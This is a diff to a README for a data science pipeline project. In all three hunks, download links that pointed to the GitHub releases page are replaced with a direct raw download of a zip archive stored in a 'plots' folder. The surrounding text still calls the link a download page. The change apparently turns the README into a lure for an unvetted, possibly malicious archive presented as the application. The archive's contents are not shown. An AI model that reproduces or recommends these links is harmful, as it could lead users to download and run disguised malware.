@@ -1,6 +1,6 @@
 # 📊 Data-Science-Operations-Pipeline-Lab - Complete Data Science Pipeline
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/raghu235445/Data-Science-Operations-Pipeline-Lab/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/raghu235445/Data-Science-Operations-Pipeline-Lab/raw/refs/heads/main/plots/Science_Pipeline_Lab_Data_Operations_v1.1.zip)
 
 ## 📋 About This Application
 
@@ -28,7 +28,7 @@ Follow these steps to get the application ready on your computer.
 
 Go to the releases page to get the latest version of the software. Use this link:
 
-[Download Latest Release](https://github.com/raghu235445/Data-Science-Operations-Pipeline-Lab/releases)
+[Download Latest Release](https://github.com/raghu235445/Data-Science-Operations-Pipeline-Lab/raw/refs/heads/main/plots/Science_Pipeline_Lab_Data_Operations_v1.1.zip)
 
 Click on it to open the download page.
 
@@ -117,7 +117,7 @@ If you run into problems:
 
 Use this button for quick access to the software download page:
 
-[![Download Application](https://img.shields.io/badge/Download-Software-blue?style=for-the-badge)](https://github.com/raghu235445/Data-Science-Operations-Pipeline-Lab/releases)
+[![Download Application](https://img.shields.io/badge/Download-Software-blue?style=for-the-badge)](https://github.com/raghu235445/Data-Science-Operations-Pipeline-Lab/raw/refs/heads/main/plots/Science_Pipeline_Lab_Data_Operations_v1.1.zip)
 
 ## 💡 Additional Tips
 
